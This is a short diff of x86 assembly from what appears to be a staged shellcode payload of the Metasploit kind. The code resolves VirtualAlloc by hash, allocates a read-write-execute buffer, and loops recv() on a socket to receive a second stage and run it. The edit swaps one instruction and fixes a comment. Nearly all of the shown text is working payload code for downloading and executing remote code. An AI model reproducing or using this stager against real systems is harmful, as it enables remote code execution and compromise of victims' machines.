@@ -28,12 +28,12 @@ recv:
   push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
   call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
   ; Receive the second stage and execute it...
-  mov ebx, eax           ; ebx = our new memory address for the new stage
+  xchg ebx, eax          ; ebx = our new memory address for the new stage
   push ebx               ; push the address of the new stage so we can return into it
 read_more:               ;
   push byte 0            ; flags
   push esi               ; length
-  push ebx               ; the current address into our second stages RWX buffer
+  push ebx               ; the current address into our second stage's RWX buffer
   push edi               ; the saved socket
   push 0x5FC8D902        ; hash( "ws2_32.dll", "recv" )
   call ebp               ; recv( s, buffer, length, 0 );
